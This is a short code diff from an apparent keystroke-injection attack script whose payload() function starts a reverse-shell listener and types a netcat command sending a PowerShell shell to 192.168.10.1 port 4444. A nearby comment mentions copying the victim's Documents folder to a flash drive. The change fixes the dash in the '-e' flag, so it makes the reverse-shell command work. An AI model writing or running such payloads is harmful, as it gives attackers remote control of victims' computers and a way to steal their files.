@@ -55,7 +55,7 @@ def payload():
 
 	shelllistener=Process(target=reverse_shell_listener)
 	shelllistener.start()
-	eco.type("./nc.exe 192.168.10.1 4444 –e powershell.exe")
+	eco.type("./nc.exe 192.168.10.1 4444 -e powershell.exe")
 	shelllistener.join()
 	# Copy Documents Directory to Flash Drive
 	httpd.server_close()
